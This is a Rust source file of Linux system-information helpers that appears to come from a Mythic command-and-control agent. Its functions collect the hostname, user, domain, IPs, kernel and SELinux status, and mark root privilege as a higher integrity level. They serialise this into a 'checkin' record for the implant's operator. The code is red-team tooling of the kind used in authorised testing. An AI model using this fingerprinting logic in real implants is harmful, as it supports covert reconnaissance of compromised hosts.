//! Linux-specific utility functions for system information gathering

use serde::Serialize;
use std::ffi::CStr;

/// Platform information functions
pub mod whoami {
    use std::ffi::CStr;

    /// Grabs the platform information for Linux including the kernel version
    /// and checks if the system has SELinux installed
    pub fn platform() -> String {
        let mut name: libc::utsname = unsafe { std::mem::zeroed() };

        let kernel = "Linux".to_string();

        // Check if the system is SELinux
        let selinux = if std::path::Path::new("/sys/fs/selinux").exists() {
            "(Security Enhanced)"
        } else {
            ""
        }
        .to_string();

        // Get the uname information from the system
        if unsafe { libc::uname(&mut name) } != 0 {
            if !selinux.is_empty() {
                return format!("{} {}", kernel, selinux);
            } else {
                return kernel;
            }
        }

        // Check if the `uname` libc call succeeded and return the platform along with
        // the kernel version; otherwise, just return the platform
        let release = if let Ok(release) = unsafe { CStr::from_ptr(name.release.as_ptr()) }.to_str()
        {
            release
        } else if !selinux.is_empty() {
            return format!("{} {}", kernel, selinux);
        } else {
            return kernel;
        };

        // Create the output including SELinux information
        if !selinux.is_empty() {
            format!("{} {} {}", kernel, release, selinux)
        } else {
            format!("{} {}", kernel, release)
        }
    }

    /// Grabs the generic platform name without the kernel version or SELinux information
    pub fn generic_platform() -> String {
        "Linux".to_string()
    }

    /// Gets the username the agent is associated with
    pub fn username() -> Option<String> {
        // Get the passwd entry for the current uid
        let passwd = unsafe { libc::getpwuid(libc::getuid()) };
        if passwd.is_null() {
            return None;
        }

        let passwd = unsafe { &*passwd };
        if passwd.pw_name.is_null() {
            return None;
        }

        // Return the `pw_name` member of the `passwd` struct
        let name_str = unsafe { CStr::from_ptr(passwd.pw_name) };
        match name_str.to_str() {
            Ok(name) => Some(name.to_owned()),
            Err(_) => None,
        }
    }

    /// Grabs the hostname of the system
    pub fn hostname() -> Option<String> {
        let mut host = [0i8; 256];

        // Get the system hostname using libc
        let ret = unsafe { libc::gethostname(host.as_mut_ptr(), 255) };
        if ret == -1 {
            return None;
        }

        let name_ptr = unsafe { CStr::from_ptr(host.as_ptr()) };
        match name_ptr.to_str() {
            Ok(name) => Some(name.to_owned()),
            Err(_) => None,
        }
    }

    /// Grabs the domain name of the system
    pub fn domain() -> Option<String> {
        let mut name: libc::utsname = unsafe { std::mem::zeroed() };

        // Get the system domain name if it exists
        if unsafe { libc::uname(&mut name) } != 0 {
            return None;
        }

        let domainname = unsafe { CStr::from_ptr(name.domainname.as_ptr()) }
            .to_str()
            .ok()?;

        if domainname == "(none)" || domainname.is_empty() {
            return None;
        }

        Some(domainname.to_string())
    }
}

/// Converts an integer uid to its corresponding user name
/// * `uid` - UID for the user to get the username from
pub fn get_user_from_uid(uid: u32) -> Option<String> {
    // Get the passwd entry for the uid parameter
    let pw_struct = unsafe { libc::getpwuid(uid) };
    if pw_struct.is_null() {
        return None;
    }

    // Return the username as a String
    let raw_name = unsafe { CStr::from_ptr((*pw_struct).pw_name) };
    raw_name.to_str().map(|x| x.to_string()).ok()
}

/// Converts an integer gid to its corresponding group name
pub fn get_group_from_gid(gid: u32) -> Option<String> {
    // Get the group file entry
    let g_struct = unsafe { libc::getgrgid(gid) };
    if g_struct.is_null() {
        return None;
    }

    // Return the group name as a String
    let raw_group = unsafe { CStr::from_ptr((*g_struct).gr_name) };
    raw_group.to_str().map(|x| x.to_string()).ok()
}

/// Checkin info for Mythic initial check in
#[derive(Serialize)]
struct CheckinInfo {
    /// Action (checkin)
    action: String,

    /// Internal IP address
    ips: Vec<String>,

    /// OS information
    os: String,

    /// User name
    user: String,

    /// Host name
    host: String,

    /// Current process id
    pid: u32,

    /// Mythic UUID
    uuid: String,

    /// Agent architecture
    architecture: String,

    /// Agent integrity level
    integrity_level: u32,

    /// Machine domain name
    domain: Option<String>,
}

/// Get the check in information for Linux systems
pub fn get_checkin_info() -> String {
    // Get the current uid
    let uid = unsafe { libc::getuid() };

    // Set the integrity level to 3 if running as root
    let integrity_level = if uid == 0 { 3 } else { 2 };

    let info = CheckinInfo {
        action: "checkin".to_string(),
        ips: vec![crate::utils::local_ipaddress::get().unwrap_or_default()],
        os: whoami::platform(),
        user: whoami::username().unwrap_or_default(),
        host: whoami::hostname().unwrap_or_default(),
        pid: std::process::id(),
        uuid: crate::payloadvars::payload_uuid(),
        architecture: std::env::consts::ARCH.to_string(),
        integrity_level,
        domain: whoami::domain(),
    };

    serde_json::to_string(&info).unwrap()
}

/// Check if the current process is running as root
pub fn is_root() -> bool {
    unsafe { libc::getuid() == 0 }
}

/// Get the current process ID
pub fn getpid() -> u32 {
    unsafe { libc::getpid() as u32 }
}

/// Get the parent process ID
pub fn getppid() -> u32 {
    unsafe { libc::getppid() as u32 }
}

/// Get system uptime in seconds
pub fn get_uptime() -> Option<u64> {
    use std::fs;

    let uptime_str = fs::read_to_string("/proc/uptime").ok()?;
    let uptime_float: f64 = uptime_str.split_whitespace().next()?.parse().ok()?;
    Some(uptime_float as u64)
}

/// Get memory information from /proc/meminfo
pub fn get_memory_info() -> Option<(u64, u64, u64)> {
    use std::fs;

    let meminfo = fs::read_to_string("/proc/meminfo").ok()?;
    let mut total = 0u64;
    let mut free = 0u64;
    let mut available = 0u64;

    for line in meminfo.lines() {
        if line.starts_with("MemTotal:") {
            total = parse_meminfo_value(line)?;
        } else if line.starts_with("MemFree:") {
            free = parse_meminfo_value(line)?;
        } else if line.starts_with("MemAvailable:") {
            available = parse_meminfo_value(line)?;
        }
    }

    Some((total, free, available))
}

/// Parse memory value from /proc/meminfo line
fn parse_meminfo_value(line: &str) -> Option<u64> {
    let parts: Vec<&str> = line.split_whitespace().collect();
    if parts.len() >= 2 {
        parts[1].parse().ok()
    } else {
        None
    }
}

/// Check if a service is running (systemd)
pub fn is_service_running(service_name: &str) -> bool {
    use std::process::Command;

    match Command::new("systemctl")
        .args(&["is-active", "--quiet", service_name])
        .status()
    {
        Ok(status) => status.success(),
        Err(_) => false,
    }
}

/// Get list of network interfaces
pub fn get_network_interfaces() -> Vec<String> {
    use std::fs;

    let mut interfaces = Vec::new();

    if let Ok(entries) = fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            if let Some(name) = entry.file_name().to_str() {
                if name != "lo" {
                    // Skip loopback
                    interfaces.push(name.to_string());
                }
            }
        }
    }

    interfaces
}
